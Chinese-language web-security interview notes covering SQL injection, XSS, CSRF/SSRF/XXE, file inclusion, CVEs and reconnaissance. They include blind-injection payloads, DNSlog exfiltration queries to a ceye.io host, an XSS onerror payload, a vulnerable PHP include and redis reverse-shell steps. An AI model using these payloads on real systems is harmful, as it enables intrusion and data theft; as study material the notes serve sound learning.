TCP三次握手、四次挥手</h3><p>三次握手：</p><ol><li>第一次握手：客户端发送syn包(seq=x)到服务器，并进入SYN_SEND状态，等待服务器确认。</li><li>第二次握手：服务器收到syn包，必须确认客户的SYN(ack=x+1)，同时自己也发送一个SYN包(seq=y)，即SYN+ACK包，此时服务器进入SYN_RECV状态。</li><li>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=y+1)，此包发送完毕，客户端和服务器进入ESTABLISHED状态，完成三次握手。</li></ol><p>四次挥手：</p><ol><li>第一次挥手：主动关闭方发送一个FIN，用来关闭主动方到被动关闭方的数据传送，也就是主动关闭方告诉被动关闭方：我已经不会再给你发数据了。</li><li>第二次挥手：被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1。</li><li>第三次挥手：被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动关闭方，我的数据也发送完了，不会再给你发数据了。</li><li>第四次挥手：主动关闭方收到FIN后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成四次挥手。</li></ol><h2 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h2><h3 id="浏览器解析顺序和解码顺序"><a class="markdownIt-Anchor" href="#浏览器解析顺序和解码顺序"></a> 浏览器解析顺序和解码顺序</h3><p>参考：<a href="https://cloud.tencent.com/developer/article/1516371">https://cloud.tencent.com/developer/article/1516371</a></p><p>首先要强调是一点是：浏览器的解码顺序和解析顺序是两码事。</p><p>首先要了解我们在构造xss包的时候发生了什么：</p><ol><li>在浏览器的地址栏中输入url，发送http请求头和数据，浏览器就会对其进行<strong>解码</strong>，顺序如下，解码完成传给服务器：<ol><li>HTML解码</li><li>JS解码（所以写在script里面的HTML编码没办法解码）</li><li>URL解码</li></ol></li><li>数据包通过网络传输到达远程web服务器，服务器接收到url，<strong>分析请求头</strong>，根据它找到对应资源，经过后端代码进行处理（过滤，校验），然后给前端返回响应头和数据；</li><li>浏览器接收到响应的数据后，对数据进行<strong>解析</strong>（下面要说的事）<ol><li>浏览器解析代码的顺序是：<code>HTML代码=JS代码&gt;代码</code>，即HTML代码与JS代码属于同一级，从上向下解析（导致HTML声明的对象必须要在JS代码调用前实现）</li><li>解析html标签过程中遇到<code>&lt;script&gt;</code>标签，则暂停HTML标签解析，控制权转交给JavaScript引擎，执行完后继续解析html，js可以对DOM进行修改</li></ol></li></ol><h4 id="解析顺序"><a class="markdownIt-Anchor" href="#解析顺序"></a> 解析顺序</h4><p>主要分为两个过程：</p><ol><li><p>浏览器接收到响应数据后，解析器先对HTML之类的文档进行解析，构建成DOM节点树，同时，CSS会被CSS解析器解析生成样式表。</p></li><li><p>解析html标签过程中遇到<code>&lt;script&gt;</code>标签，则暂停HTML标签解析，控制权转交给JavaScript引擎，执行完后继续解析html，js可以对DOM进行修改。</p></li></ol><p>所以浏览器解析代码的顺序是：<code>HTML代码=JS代码&gt;代码</code>，即HTML代码与JS代码属于同一级，从上向下解析（导致HTML声明的对象必须要在JS代码调用前实现），JQuery代码则是浏览器解析完HTML代码和JS代码后才会开始解析JQuery代码。</p><h4 id="解码顺序"><a class="markdownIt-Anchor" href="#解码顺序"></a> 解码顺序</h4><p>浏览器一般的解码顺序是</p><ol><li>先进行html解码</li><li>再进行javascript解码</li><li>最后再进行url解码</li></ol><p>需要注意的是这里的url解码和我们发送到服务器的url解码不同，那个过程是由服务器来完成的，而不是浏览器。</p><p>明白了这个顺序，我们就可以理解<code>&lt;script&gt;alert&amp;#40;'1')&lt;/script&gt;</code>是无法弹框的，因为script标签内无法解析HTML实体编码。</p><h1 id="top10"><a class="markdownIt-Anchor" href="#top10"></a> TOP10</h1><h2 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> SQL注入</h2><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/SQL%E6%B3%A8%E5%85%A5.png" alt="SQL注入" /></p><h3 id="sql注入的原理-危害-修复方式以及如何发现这个是否存在sql注入"><a class="markdownIt-Anchor" href="#sql注入的原理-危害-修复方式以及如何发现这个是否存在sql注入"></a> SQL注入的原理、危害、修复方式？以及如何发现这个是否存在sql注入？</h3><p><strong>原理</strong>：由于在有用户可控参数的sql查询语句中采用了直接拼接该参数，没有做过滤或者其他防御措施</p><p><strong>危害</strong>：导致用户可以非法获取数据库中的其他信息，甚至于getshell和提权</p><p><strong>修复</strong>：采用预编译、限制输入长度、过滤关键字、同意输出</p><p>**判断：**输入<code>1' and 1=1/2 --+</code>查看是否出现错误页面，或者观察是否有延迟，输入单引号查看是否有报错等</p><h3 id="mybatis预编译是怎么做的怎么绕过预编译"><a class="markdownIt-Anchor" href="#mybatis预编译是怎么做的怎么绕过预编译"></a> Mybatis预编译是怎么做的？怎么绕过预编译？</h3><p><strong>Mybatis的预编译</strong>采用：<code>#&#123;&#125;</code>，注意：<code>$&#123;&#125;</code>不是预编译，而只是单纯的拼接。</p><p><strong>参数化查询</strong>：即使用<code>?</code>，代替参数，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">... <span class="type">where</span> <span class="variable">name</span> <span class="operator">=</span> ?<span class="number">1</span>; query.setParameter(<span class="number">1</span>, parameter);</span><br></pre></td></tr></table></figure><p><strong>预编译CASE注入</strong>：<strong>例如SQL语句中order by 后面的参数无法使用预编译赋值</strong>。此时应严格检验用户输入的参数类型、参数格式等是否符合程序预期要求。所以会存在 <strong>绕过</strong>：</p><blockquote><p><strong>通过case when语句可以将order by后的orderExpression表达式中添加select语句</strong></p></blockquote><h3 id="时间型盲注和布尔型盲注有什么区别吗怎么写脚本"><a class="markdownIt-Anchor" href="#时间型盲注和布尔型盲注有什么区别吗怎么写脚本"></a> 时间型盲注和布尔型盲注有什么区别吗？怎么写脚本？</h3><p>布尔型盲注可以通过返回页面的成功与否判断所猜测的字符是否正确。而时间型盲注返回的页面都是一样的，通过是否成功执行sleep函数来判断猜测字符是否正确。他们的编写逻辑都是一样的：</p><p>首先判断数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and substr((select @@database), 1, 1)=&#x27;</span>a<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> @<span class="variable">@database</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">105</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(3)) --+</span></span><br></pre></td></tr></table></figure><h3 id="过滤逗号的sql注入如何绕过limit"><a class="markdownIt-Anchor" href="#过滤逗号的sql注入如何绕过limit"></a> 过滤逗号的SQL注入如何绕过（limit）</h3><p>使用from或者offset，具体来说</p><ol><li>如果是过滤limit后的逗号，可以使用offset来替换，例如：<code>select * from user where id &gt; 2 limit 2 offset 3</code>，等价于：<code>limit 3, 2</code>，即以下标3为开始，输出两个。</li><li>如果是过滤substr，mid等盲注需要的函数，则可使用from for代替，例如：<code>-1' and substr((select name from user where id = 1 limit 1 offset 0) from 1 for 2)</code>，相当于<code>substr(~, 1, 2)</code></li><li>其他的还可以用<code>like</code>和<code>join</code>代替（也就是不使用mid等函数，直接等于正则）。</li></ol><h3 id="redis未授权漏洞的利用方法"><a class="markdownIt-Anchor" href="#redis未授权漏洞的利用方法"></a> redis未授权漏洞的利用方法</h3><p>都是ROOT权限</p><ol><li><p>写ssh公钥</p></li><li><p>写计划任务/var/spool/cron，反弹shell</p></li><li><p>写webshell</p><p>得知道绝对路径</p></li><li><p>主从复制getshell</p><blockquote><p>主从复制是为了缓解数据库压力，使用两个数据库，一个读一个写，分担流量压力。在redis 4.x到5.x间，可以如此操作：</p><p>将自己设为主机，将受害这设为从机，自己编写一个.so恶意文件，使用FULLRESYNC（实际上使用工具Redis-RCE）加载到从机上运行so，即可get反弹shell</p></blockquote></li></ol><h3 id="单引号被过滤了怎么办"><a class="markdownIt-Anchor" href="#单引号被过滤了怎么办"></a> 单引号被过滤了怎么办</h3><ol><li>采用url编码：%27</li><li>使用括号</li></ol><h3 id="mysql一个和两个"><a class="markdownIt-Anchor" href="#mysql一个和两个"></a> mysql一个@和两个@@</h3><p>一个是用户自定义变量，两个是系统变量</p><h3 id="sleep被禁止后怎么进行sql注入"><a class="markdownIt-Anchor" href="#sleep被禁止后怎么进行sql注入"></a> sleep被禁止后怎么进行sql注入</h3><p>等价替代函数：benchmark，get_lock函数</p><h3 id="sql注入无回显的情况下利用dnslogmysql下利用什么构造代码mssql下又如何"><a class="markdownIt-Anchor" href="#sql注入无回显的情况下利用dnslogmysql下利用什么构造代码mssql下又如何"></a> sql注入无回显的情况下，利用DNSlog，mysql下利用什么构造代码？mssql下又如何？</h3><p>无回显一般有两种解决思路：</p><ol><li><p>DNSlog外带</p><p>把注入代码写到请求中，读取DNS解析日志即可</p></li><li><p>盲注（时间和布尔）</p><p>需要写脚本，多次请求所以容易被封IP，需要使用代理池</p></li></ol><p>代码构造：</p><ol><li><p>mysql利用load_file：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> if((<span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;.xxx.cey e.io\abc&#x27;</span>))),<span class="number">1</span>,<span class="number">0</span>)#</span><br></pre></td></tr></table></figure></li><li><p>mssql利用master…xp_dirtree以及堆叠注入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> @ hostvarchar(<span class="number">1024</span>);<span class="keyword">SELECT</span> @ host<span class="operator">=</span>(SELECTdb_name())<span class="operator">+</span><span class="string">&#x27;.xxx.ceye.io&#x27;</span>;<span class="keyword">EXEC</span>(<span class="string">&#x27;master..xp_dirtree&quot;&#x27;</span><span class="operator">+</span><span class="variable">@host</span><span class="operator">+</span><span class="string">&#x27;\foobar$&quot;&#x27;</span>);</span><br></pre></td></tr></table></figure></li></ol><h3 id="宽字节注入漏洞原理-利用方式及修复方案"><a class="markdownIt-Anchor" href="#宽字节注入漏洞原理-利用方式及修复方案"></a> 宽字节注入漏洞原理、利用方式及修复方案</h3><p>原理：</p><ul><li>在mysql中使用了gbk编码，占用两个字节，而mysql的一个特性是GBK多字节编码，它会认为两个字节就代表一个汉字</li><li>注：GB2312不存在此问题，取值范围不同</li></ul><p>利用：</p><ul><li><p>%df时候会和转义符\（即%5c）进行结合，所以单引号就逃逸了出来</p><p>注：我们不仅只是能输入%df ，我们只要输入的数据的ASCII码大于128就可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1%df&#x27;</span><br><span class="line"># GPC转义</span><br><span class="line">id=1%df\&#x27;</span><br><span class="line">id=1%df%5c&#x27;</span><br><span class="line">id=1運&#x27;</span><br></pre></td></tr></table></figure></li></ul><p>修复方案：</p><ol><li>预编译，参数化查询</li><li>使用mysql_real_escape_string代替addslshes函数对用户输入进行转义</li><li>调用mysql_set_charset函数，声明为gbk</li></ol><h3 id="udf提权有没有了解过"><a class="markdownIt-Anchor" href="#udf提权有没有了解过"></a> UDF提权有没有了解过</h3><p>UDF允许用户加载自定义的功能函数，而由于该UDF函数可以动态加载，则我们可以将恶意UDF文件上传到数据库，放在指定位置（Mysql&gt;5.1放在Mysql根目录的lib\plugin文件夹下），执行我们的函数（例如给find赋权，通过suid提权，或者写个反弹shell也可以）。</p><h3 id="如何突破注入时字符被转义"><a class="markdownIt-Anchor" href="#如何突破注入时字符被转义"></a> 如何突破注入时字符被转义？</h3><ul><li><p>宽字符注入</p></li><li><p>hex编码绕过</p></li></ul><h3 id="sqlmap自带脚本你知道哪些"><a class="markdownIt-Anchor" href="#sqlmap自带脚本你知道哪些"></a> sqlmap自带脚本你知道哪些</h3><ol><li><a href="http://apostrophemask.py">apostrophemask.py</a> ：将引号替换为UTF-8,用于过滤单引号。</li><li><a href="http://base64encode.py">base64encode.py</a> :替换为base64编码。</li><li><a href="http://multiplespaces.py">multiplespaces.py</a>:围绕SQL关键字添加多个空格。</li><li><a href="http://space2plus.py">space2plus.py</a>:用+号替换为空格</li></ol><p>也可以自己写tamper</p><h3 id="sqlmap中os-shell的原理及利用条件"><a class="markdownIt-Anchor" href="#sqlmap中os-shell的原理及利用条件"></a> sqlmap中–os-shell的原理及利用条件</h3><ul><li>利用条件<ul><li>root权限</li><li>知道绝对路径，Secure_file_priv参数为空或者为指定路径</li><li>GPC关闭</li></ul></li><li>原理及流程：利用SQL注入，通过数据库的外连功能，将一句话木马或者其他可执行文件写入到服务器的web目录下，利用shell传参进行命令执行，退出时删除shell</li><li>当然数据库不同，必要条件也不同，例如<strong>sqlserver需要数据库支持外连</strong>，数据库权限为SA权限，主要利用xp_cmdshell扩展进行命令执行。</li><li>原理细致分析：<a href="https://xz.aliyun.com/t/7942#toc-4">https://xz.aliyun.com/t/7942#toc-4</a></li></ul><h3 id="xp_cmdshell有什么限制"><a class="markdownIt-Anchor" href="#xp_cmdshell有什么限制"></a> xp_cmdshell有什么限制？</h3><p>只能用在mssql上</p><h3 id="sqlmap如何判断一个网站是否存在sql注入漏洞"><a class="markdownIt-Anchor" href="#sqlmap如何判断一个网站是否存在sql注入漏洞"></a> sqlmap如何判断一个网站是否存在sql注入漏洞？</h3><p>主要还是手工那一套，然后通过<code>-f</code>来看看数据库类型</p><h3 id="sqlmap如何列出数据库表和字段"><a class="markdownIt-Anchor" href="#sqlmap如何列出数据库表和字段"></a> sqlmap如何列出数据库，表和字段？</h3><p><code>-D</code>、<code>-</code></p><h3 id="sqlmap如何执行任意sql语句和系统命令"><a class="markdownIt-Anchor" href="#sqlmap如何执行任意sql语句和系统命令"></a> sqlmap如何执行任意sql语句和系统命令？</h3><h3 id="sqlmap如何绕过waf和防火墙"><a class="markdownIt-Anchor" href="#sqlmap如何绕过waf和防火墙"></a> sqlmap如何绕过waf和防火墙？</h3><h3 id="找到一个注入点怎么判断对方什么数据库"><a class="markdownIt-Anchor" href="#找到一个注入点怎么判断对方什么数据库"></a> 找到一个注入点怎么判断对方什么数据库</h3><p>常用数据库有：</p><blockquote><p>mysql 3306 | mssql 1433 | oracle 1521 | access是文件型数据库不需要端口号</p></blockquote><ol><li>特定的错误<ul><li>MySQL：有MySQL字样</li><li>MSSQL：包含Microsoft ODBC字样</li><li>Oracle：包含ORA…字样</li><li>Access：包含Microsoft JET字样</li></ul></li><li>使用特定函数</li><li>使用特定表<ol><li>mssql：systemobject</li><li>Oracle：dual</li><li>mysql：information_schema</li></ol></li></ol><h3 id="access扫出后缀为asp的数据库文件访问乱码-如何实现到本地利用"><a class="markdownIt-Anchor" href="#access扫出后缀为asp的数据库文件访问乱码-如何实现到本地利用"></a> access扫出后缀为asp的数据库文件，访问乱码。如何实现到本地利用</h3><p>迅雷下载改后缀为<code>.mdb</code></p><h2 id="xsscorsjsonpcsp"><a class="markdownIt-Anchor" href="#xsscorsjsonpcsp"></a> XSS/CORS/JSONP/CSP</h2><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/XSSCORSJSONPCSP.png" alt="XSSCORSJSONPCSP" /></p><h3 id="输出到href的xss如何防御"><a class="markdownIt-Anchor" href="#输出到href的xss如何防御"></a> 输出到href的XSS如何防御</h3><p>参考：<a href="https://blog.csdn.net/m0_53008479/article/details/124487401">https://blog.csdn.net/m0_53008479/article/details/124487401</a></p><p>输出出现在<strong>a标签的href属性</strong>里面，可以使用<strong>javascript协议</strong>来执行js</p><ol><li><strong>限制协议</strong>：a标签的href属性中一般放的是URL（链接），所以我们可以规定， 这里的输入<strong>必须以http或者https开头</strong>，否则不予以输入。</li><li><strong>实体编码</strong>：再对这里进行<code>htmlspecialchars($str, ENT_QUOTES);</code>函数处理。（注：这个函数是把html特殊字符转为html实体）</li></ol><h3 id="xss的防护方法有哪些httponly如何绕过"><a class="markdownIt-Anchor" href="#xss的防护方法有哪些httponly如何绕过"></a> XSS的防护方法有哪些？httponly如何绕过？</h3><p>防护：</p><ol><li>对输入输出进行实体编码，即纯前端渲染</li><li>过滤关键词，例如script等</li><li>httponly，禁止js前端读取cookie</li></ol><p>绕过：</p><ol><li><p>用密码登录</p><ol><li>XSS伪造表单，记录登录账号密码，直接登进去</li><li>获取浏览器里面的账号密码</li><li>键盘记录</li></ol></li><li><p>利用其他漏洞：CORS、phpinfo、Apache</p><ul><li><p>phpinfo里有：<code>$_SERVER['HTTP_COOKIE']</code></p></li><li><p>Apache：漏洞CVE-2012-0053，植入超大COOKIE，报400错误，里面有cookie</p></li><li><p>CORS：<code>Access-Control-Allow-Origin:*</code>，构造CORS跨域能获取敏感信息的HTML，放在我们的服务器中，然后嵌入script：<code>windows.open(我们服务器的EXP)</code>，即可。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;x&quot;</span> οnerrοr=<span class="attr">javascript</span>:<span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;http://192.168.38.1/cors.html&quot;</span>)&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ol><blockquote><p>Host/Referer/Origin的区别</p><ol><li>Host：去哪里，域名+端口</li><li>Referer：来自哪里，协议+域名+端口+路径+参数</li><li>Origin：来自哪里（跨域），协议+域名+端口</li></ol></blockquote><h2 id="csrfssrfxxe"><a class="markdownIt-Anchor" href="#csrfssrfxxe"></a> CSRF/SSRF/XXE</h2><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/CSRFSSRFXXE.png" alt="CSRFSSRFXXE" /></p><h3 id="csrf与xss的区别"><a class="markdownIt-Anchor" href="#csrf与xss的区别"></a> CSRF与XSS的区别</h3><table><thead><tr><th></th><th>CSRF</th><th>XSS</th></tr></thead><tbody><tr><td>手法</td><td>诱导用户访问已登录的网站，完成用户非预期操作</td><td>诱导用户触发js脚本，执行js脚本，如获取cookie</td></tr></tbody></table><h3 id="samesite防御csrf的原理"><a class="markdownIt-Anchor" href="#samesite防御csrf的原理"></a> samesite防御CSRF的原理</h3><blockquote><p>服务器可以在设置cookie时指定SameSite属性，以表明当来自外部站点时不应该发送cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: JSESSIONID=randomid; Domain=bank.example.com; Secure; HttpOnly; SameSite=Lax</span><br></pre></td></tr></table></figure></blockquote><h3 id="xxe的危害哪些地方容易存在xxexxe架构方面有没有了解过"><a class="markdownIt-Anchor" href="#xxe的危害哪些地方容易存在xxexxe架构方面有没有了解过"></a> XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过？</h3><p>危害：</p><ul><li>能够引入恶意的外部实体，执行任意命令、文件读取、内网探测（可以使用协议gopher、file、dict、http）、攻击内网服务等</li></ul><p>出现点：</p><ul><li>与SSRF出现的点差不多，例如在线功能（pdf在线解析、word在线解析），留言板等</li></ul><p>防范：</p><ol><li>禁止外部实体</li><li>过滤提交的XML</li></ol><p>架构：</p><ol><li><p>客户端也可以有xxe攻击，有的网站会使用office打开docx进行解析</p></li><li><p>Java解析XML的常用三方库，如果不禁用DTD、Entity都会导致XXE漏洞：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.stream.XMLStreamReader;</span><br><span class="line">javax.xml.parsers.DocumentBuilderFactory;</span><br></pre></td></tr></table></figure></li></ol><h3 id="ssrf怎么用redis写shell"><a class="markdownIt-Anchor" href="#ssrf怎么用redis写shell"></a> ssrf怎么用redis写shell</h3><ol><li>使用dict协议获取banner：<code>dict://&lt;ip&gt;/info</code>，得到redis版本</li><li>使用gopher协议操作redis，将请求操作（redis操作）的数据包编码，使用该协议发送即可</li><li>利用redis将反弹shell写入计划任务等操作，获得shell</li></ol><h3 id="json格式的csrf如何防御"><a class="markdownIt-Anchor" href="#json格式的csrf如何防御"></a> json格式的CSRF如何防御</h3><ul><li>启用CSRF令牌</li></ul><p>{ “name”: “John”, “age”: 30, “csrf_token”: “random_string_here” }</p><ul><li>使用SameSite Cookie<ul><li>具体实现方式可以在每个JSON请求中添加一个带有SameSite属性的Cookie，如下所示。<ul><li>Cookie: session_id=random_string_here; SameSite=Strict</li></ul></li></ul></li></ul><h2 id="文件包含文件上传目录遍历目录穿越"><a class="markdownIt-Anchor" href="#文件包含文件上传目录遍历目录穿越"></a> 文件包含/文件上传/目录遍历/目录穿越</h2><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8C%85%E5%90%AB%E8%AF%BB%E5%8F%96%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A.png" alt="文件上传包含读取目录穿越" /></p><h3 id="文件包含getshell思路"><a class="markdownIt-Anchor" href="#文件包含getshell思路"></a> 文件包含getshell思路</h3><p>上传/写入webshell，并知道shell目录</p><ol><li><p>通过文件上传的方式上传可执行文件到已知目录，可以是图片码（这个可以通过htaccess或者解析漏洞）</p></li><li><p>通过错误日志（例如apache，nginx），写shell</p></li><li><p>通过伪协议：</p><ol><li><p><code>php://input</code>，执行PHP代码（该内容在post-data中）</p></li><li><p><code>php://filter</code>，读取敏感文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?file=php://filter/convert.base64-encode/resource=config.php</span><br></pre></td></tr></table></figure></li></ol></li></ol><p>免杀shell，可以参考项目</p><h3 id="php的00截断的原理是什么"><a class="markdownIt-Anchor" href="#php的00截断的原理是什么"></a> php的%00截断的原理是什么？</h3><ul><li>因为在C语言中字符串的结束标识符%00是结束符号，而PHP就是C写的，所以继承了C的特性，所以判断为%00是结束符号不会继续往后执行</li><li>条件：PHP&lt;5.3.29，且GPC关闭。</li></ul><h3 id="php的lfi本地包含漏洞原理是什么写一段带有漏洞的代码-手工的话如何发掘如果无报错回显你是怎么遍历文件的"><a class="markdownIt-Anchor" href="#php的lfi本地包含漏洞原理是什么写一段带有漏洞的代码-手工的话如何发掘如果无报错回显你是怎么遍历文件的"></a> php的LFI（本地包含漏洞）原理是什么？写一段带有漏洞的代码。手工的话如何发掘？如果无报错回显，你是怎么遍历文件的？</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理：</p><ul><li>包含的文件设置为变量</li><li>变量无过滤导致可以调用恶意文件 还可以对远程文件包含，但需要开启<code>allow_url_include = ON </code>。</li></ul><p>测试：</p><ul><li>通过测试参数的地方进行本地文件/etc/passwd等包含</li></ul><p>无报错如何遍历文件：</p><ul><li>为何存在漏洞而且没有回显：有可能没有显示在页面而是在网页源代码中</li><li>遍历文件：<ul><li>利用DNSlog进行获取包含的信息。从index.php文件一级级往读取</li><li>可以利用PHP封装协议读取文件，例如file协议等。</li></ul></li></ul><h2 id="反序列化漏洞"><a class="markdownIt-Anchor" href="#反序列化漏洞"></a> 反序列化漏洞</h2><h3 id="php"><a class="markdownIt-Anchor" href="#php"></a> PHP</h3><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="PHP反序列化" style="zoom:33%;" /><h3 id="java"><a class="markdownIt-Anchor" href="#java"></a> JAVA</h3><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80.png" alt="JAVA反序列化基础" style="zoom:33%;" /><h2 id="其他-2"><a class="markdownIt-Anchor" href="#其他-2"></a> 其他</h2><h3 id="ddos攻击"><a class="markdownIt-Anchor" href="#ddos攻击"></a> DDoS攻击</h3><p>客户端向服务端发送请求链接数据包，服务端向客户端发送确认数据包，<strong>客户端不向服务端发送确认数据包，服务器一直等待来自客户端的确认</strong></p><p>没有彻底根治的办法，除非不使用TCP</p><p>DDos预防：</p><p>（1）限制同时打开SYN半链接的数目</p><p>（2）缩短SYN半链接的Time out 时间</p><p>（3）关闭不必要的服务</p><h3 id="web典型漏洞有"><a class="markdownIt-Anchor" href="#web典型漏洞有"></a> WEB典型漏洞有</h3><ul><li>Microsoft Exchange .Net反序列化远程代码执行(CVE-2020-0688)：该漏洞是由于Exchange控制面板（ECP）组件中使用了静态密钥validationKey和decryptionKey。</li><li>Apache Tomcat 文件包含漏洞(CVE-2020-1938)：默认情况下,Tomcat会开启AJP连接器, Tomcat在AJP协议的实现上存在漏洞,导致攻击者可以通过发送恶意的请求,可以读取或者包含Web根目录下的任意文件,配合文件上传，将导致任意代码执行(RCE)。</li><li>Weblogic IIOP反序列化漏洞（CVE-2020-2551）：weblogic核心组件中IIOP协议，通过该协议对存在漏洞的WebLogic进行远程代码执行的攻击。Apache Solr远程代码执行（CVE-2019-12409）：<a href="http://xn--solr-p85f980jg51brouvuls46a.in.sh">默认配置文件solr.in.sh</a>,在其配置文件中ENABLE_REMOTE_JMX_OPTS字段默认配置不安全.如果使用默认配置,将启用JMX监视服务并将对公网监听18983的RMI端口,无需任何验证,配合JMXRMI远程代码执行。</li><li>SHIRO-550 反序列化漏洞：shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。AES的密钥是硬编码在代码里，就导致了反序列化的RCE漏洞。</li><li>SHIRO-721反序列化漏洞：不需要key，利用PaddingOracle Attack构造出RememberMe字段后段的值结合合法的RememberMe cookie即可完成攻击。</li><li>泛微Ecology OA SQL注入漏洞：validate.jsp接口的SQL注入，/cpt/manage/validate.jsp。泛微ecology OA系统接口存在数据库配置信息泄露：/mobile/dbconfigreader.jsp,直接访问该页面将为DES加密以后的乱码,使用DES算法结合硬编码的key进行解密。</li><li>Confluence 本 地 文 件 泄 露 漏 洞 (CVE-2019-3394)catalina.jar中的org.apache.catalina.webresources.StandardRoot.class的getResource方法的validate存在过滤和限制，所以可遍历路径均在/WEB-INF下。</li><li>Apache Dubbo反序列化漏洞（CVE-2019-17564）：当HTTP remoting 开启的时候，存在反序列化漏洞。</li></ul><h1 id="渗透流程"><a class="markdownIt-Anchor" href="#渗透流程"></a> 渗透流程</h1><h2 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h2><h3 id="搜集注册人邮箱有什么价值"><a class="markdownIt-Anchor" href="#搜集注册人邮箱有什么价值"></a> 搜集注册人邮箱有什么价值</h3><ol><li>丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台</li><li>用邮箱做关键词进行丢进搜索引擎</li><li>利用搜索到的关联信息找出其他邮箱进而得到常用社交账号</li><li>社工找出社交账号，里面或许会找出管理员设置密码的习惯</li><li>利用已有信息生成专用字典</li><li>观察管理员常逛哪些非大众性网站，拿下它，你会得到更多好东西</li></ol><h3 id="域名泛解析怎么处理"><a class="markdownIt-Anchor" href="#域名泛解析怎么处理"></a> 域名泛解析怎么处理</h3><p>域名泛解析就是利用通配符<code>* </code>（星号）来做次级域名以实现<strong>所有的次级域名均指向同一IP地址</strong>。如果使用Layer爆破域名得到的均会是200成功状态码，而且ttl基本一样。</p><p>判断：ping一个不可能存在的域名，如果成功了，那么就存在域名泛解析</p><p>对抗：采用<strong>IP黑名单</strong>方式。</p><ul><li>首先确定黑名单IP：多次ping随机域名，搜集固定ttl和多次出现的IP，制作黑名单</li><li>使用域名字典扫，过滤固定ttl和IP黑名单。在泛解析记录中TTL是相同的，如果TTL不相同，则不是泛解析记录。</li></ul><h3 id="cdn是什么"><a class="markdownIt-Anchor" href="#cdn是什么"></a> CDN是什么</h3><p>CDN是一组不同运行商之间的对接节点上的高速缓存服务器，把用户经常访问的静态数据资源（html、css、js、图片等文件）直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户近的节点服务器上响应给用户，只有实际产生业务交互的时候，才会与真正的服务器进行交互</p><h3 id="cdn怎么判断"><a class="markdownIt-Anchor" href="#cdn怎么判断"></a> CDN怎么判断</h3><ol><li>多地ping，看是否有多个IP</li><li>查看响应包中是否有cdn字样</li><li>查看nslookup，看有没有多个IP地址</li></ol><h3 id="如何绕过cdn"><a class="markdownIt-Anchor" href="#如何绕过cdn"></a> 如何绕过CDN</h3><ol><li>通过邮件返回的地址解析</li><li>DNS历史查看</li><li>子域名IP查看</li><li>国外访问域名（国外ping）</li><li>文件phpinfo</li></ol><h3 id="phpinfo你会关注哪些信息"><a class="markdownIt-Anchor" href="#phpinfo你会关注哪些信息"></a> 